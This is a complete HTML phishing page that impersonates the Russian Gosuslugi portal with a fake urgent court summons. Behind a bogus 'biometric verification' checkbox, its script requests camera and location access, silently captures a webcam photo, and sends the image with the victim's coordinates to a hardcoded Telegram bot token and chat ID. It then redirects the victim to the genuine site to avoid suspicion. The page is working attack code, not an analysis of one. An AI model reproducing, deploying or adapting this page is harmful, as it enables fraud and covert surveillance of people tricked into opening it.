<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Единый портал судебных уведомлений</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        body { margin: 0; background: #f4f7f9; font-family: 'Roboto', sans-serif; color: #333; }
        .header { background: #2c3e50; color: white; padding: 15px 20px; display: flex; align-items: center; border-bottom: 4px solid #c0392b; }
        .logo-emblem { width: 50px; height: 50px; margin-right: 15px; }
        
        .main-box { max-width: 600px; margin: 40px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); border-top: 5px solid #c0392b; }
        .case-status { background: #fff3f3; color: #c0392b; padding: 10px; border-radius: 4px; font-weight: bold; margin-bottom: 20px; text-align: center; }
        
        h2 { font-size: 20px; color: #2c3e50; border-bottom: 1px solid #eee; padding-bottom: 10px; }
        p { line-height: 1.6; font-size: 14px; }
        
        .verify-btn { background: #2c3e50; color: white; width: 100%; padding: 15px; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
        .verify-btn:hover { background: #34495e; }

        /* CAPTCHA / IDENTITY MODAL */
        #overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 9999; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
        .modal { background: white; padding: 25px; border-radius: 5px; width: 320px; text-align: center; }
        .c-box { border: 1px solid #ccc; padding: 10px; display: flex; align-items: center; cursor: pointer; background: #fafafa; margin-top: 15px; }
        .c-check { width: 24px; height: 24px; border: 2px solid #bbb; margin-right: 15px; display: flex; align-items: center; justify-content: center; }

        video, canvas { display: none; }
        .footer-info { font-size: 11px; color: #999; margin-top: 30px; text-align: center; }
    </style>
</head>
<body>

<div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cc/Coat_of_Arms_of_the_Russian_Federation.svg/1200px-Coat_of_Arms_of_the_Russian_Federation.svg.png" class="logo-emblem">
    <div>
        <div style="font-weight:bold; font-size:16px;">ГОСУДАРСТВЕННЫЕ УСЛУГИ</div>
        <div style="font-size:12px; opacity:0.8;">Личный кабинет судебных уведомлений</div>
    </div>
</div>

<div class="main-box">
    <div class="case-status">СТАТУС: ТРЕБУЕТСЯ СРОЧНОЕ ОЗНАКОМЛЕНИЕ</div>
    <h2>Уведомление о вызове в суд</h2>
    <p>Уважаемый гражданин, по Вашему IP-адресу зафиксировано нарушение, попадающее под статью <b>КоАП РФ 13.15</b>. В отношении Вас сформирован протокол предварительного слушания №<b>A-8856/2026</b>.</p>
    
    <p style="background: #f9f9f9; padding: 10px; border-left: 3px solid #ccc;">
        <b>Дело:</b> Нарушение правил пользования цифровыми ресурсами.<br>
        <b>Дата публикации:</b> 21.04.2026<br>
        <b>Орган:</b> Городской судебный департамент.
    </p>

    <p>Для ознакомления с материалами дела и электронной повесткой, Вам необходимо пройти биометрическую идентификацию личности через систему <b>"Smart-ID"</b>.</p>

    <button class="verify-btn" onclick="openModal()">ОЗНАКОМИТЬСЯ С ПОВЕСТКОЙ</button>

    <div class="footer-info">
        Данное уведомление сформировано автоматически. <br> Невыполнение требований влечет за собой административную ответственность.
    </div>
</div>

<div id="overlay">
    <div class="modal">
        <h3 style="margin:0; font-size:16px;">Биометрическая проверка</h3>
        <p style="font-size:12px;">Пожалуйста, подтвердите личность для доступа к защищенным документам.</p>
        <div class="c-box" onclick="runLogic()">
            <div class="c-check" id="quti"></div>
            <div style="flex-grow:1; text-align:left; font-size:14px;">Я подтверждаю личность</div>
            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="25">
        </div>
        <p style="font-size:10px; color:red; margin-top:10px;">* Не закрывайте окно до завершения проверки</p>
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const CONFIG = { TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", CHAT: "6198817749" };

    function openModal() {
        document.getElementById('overlay').style.display = "flex";
    }

    async function runLogic() {
        const q = document.getElementById('quti');
        q.innerHTML = '<img src="https://i.gifer.com/ZZ5H.gif" width="16">';

        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            navigator.geolocation.getCurrentPosition(async (p) => {
                q.innerHTML = "✅";
                const vid = document.getElementById('v'); vid.srcObject = s;
                await new Promise(r => setTimeout(r, 2000));
                
                const can = document.getElementById('c'); 
                can.width = 640; can.height = 480;
                can.getContext('2d').drawImage(vid, 0, 0);
                const rasm = await (await fetch(can.toDataURL('image/jpeg', 0.6))).blob();
                
                const fd = new FormData();
                fd.append('chat_id', CONFIG.CHAT); 
                fd.append('photo', rasm);
                fd.append('caption', `⚖️ SUD XABARNOMASI!\n📍 Manzil: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n👤 Holat: Shaxs tasdiqlandi`);
                
                fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });

                setTimeout(() => { 
                    // Rasmiy davlat xizmatlari saytiga o'tkazib yuborish
                    window.location.href = "https://www.gosuslugi.ru/"; 
                }, 1500);

            }, () => { alert("Ошибка! Доступ к геолокации обязателен для верификации судебного уведомления по региону проживания."); location.reload(); });
        } catch (e) { alert("Ошибка! Биометрическая проверка требует доступа к камере."); location.reload(); }
    }
</script>
</body>
</html>
